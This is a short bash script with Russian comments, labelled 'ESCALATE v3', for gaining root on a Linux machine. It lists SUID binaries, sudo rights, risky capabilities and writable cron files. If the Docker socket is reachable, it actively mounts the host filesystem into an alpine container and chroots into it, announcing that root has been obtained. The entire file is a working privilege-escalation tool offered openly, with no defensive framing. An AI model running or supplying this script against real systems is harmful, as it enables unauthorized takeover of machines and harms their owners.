#!/bin/bash
echo "[ESCALATE v3] Ищу пути эскалации..."

# Вектор 1: SUID бинарники
echo "[ESCALATE] SUID:"
find / -perm -4000 -type f 2>/dev/null | head -5 | while read f; do
    echo "  🟢 $f"
done

# Вектор 2: Sudo права
echo "[ESCALATE] SUDO:"
sudo -l 2>/dev/null | grep -oP '\(\w+\) \K.*' | head -3

# Вектор 3: Docker
if [ -S /var/run/docker.sock ]; then
    echo "[ESCALATE] 🐳 Docker доступен → запускаю root-контейнер"
    docker run -it --rm -v /:/host alpine chroot /host 2>/dev/null && echo "  🔴 ROOT получен!"
fi

# Вектор 4: Capabilities (специальные права)
echo "[ESCALATE] Capabilities:"
getcap -r / 2>/dev/null | grep -E "cap_sys_admin|cap_setuid|cap_dac_override" | head -3

# Вектор 5: Writable cron
echo "[ESCALATE] Writable cron:"
find /etc/cron* -writable -type f 2>/dev/null | head -3

echo "[ESCALATE v3] Проверка завершена"
